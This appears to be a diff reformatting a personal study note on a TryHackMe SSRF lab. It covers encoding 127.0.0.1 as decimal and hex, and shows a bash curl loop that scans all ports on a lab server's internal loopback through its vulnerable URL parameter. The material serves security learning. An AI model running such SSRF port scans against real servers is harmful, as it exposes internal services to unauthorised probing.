@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-01-24-tryhackme-web-fundame
 author: 100007
 ---
 
-# TryHackMe: Web Fundamentals
-
-**author:** Nathan Acks  
-**date:** 2022-01-24
-
 # SSRF
 
 ## What is SSRF?
@@ -43,8 +38,8 @@ Decimal/Hexadecimal conversion for IPv4 addresses is relatively simple if you re
 
 ```
 127.0.0.1 = (127 × 2²⁴) + (0 × 2¹⁶) + (0 × 2⁸) + (1 × 2⁰)
-= 2130706432 + 0 + 0 + 1
-= 2130706433
+          = 2130706432 + 0 + 0 + 1
+          = 2130706433
 ```
 
 Converting to hexadecimal is trivial using the excellent Qalculate tool.
@@ -73,10 +68,10 @@ TryHackMe uses a small shell script with a tight cURL loop instead of ZAP. Which
 
 ```
 for PORT in {1..65535}; do
-BODY_LENGTH="$(curl -so /dev/null http://10.10.229.43:8000/attack?url=http://0x7f000001:$PORT -w '%{size_download}')"
-if [[$BODY_LENGTH != 1045]]; then
-echo "Open port: $PORT"
-fi
+	BODY_LENGTH="$(curl -so /dev/null http://10.10.229.43:8000/attack?url=http://0x7f000001:$PORT -w '%{size_download}')"
+	if [[$BODY_LENGTH != 1045]]; then
+		echo "Open port: $PORT"
+	fi
 done
 ```
 
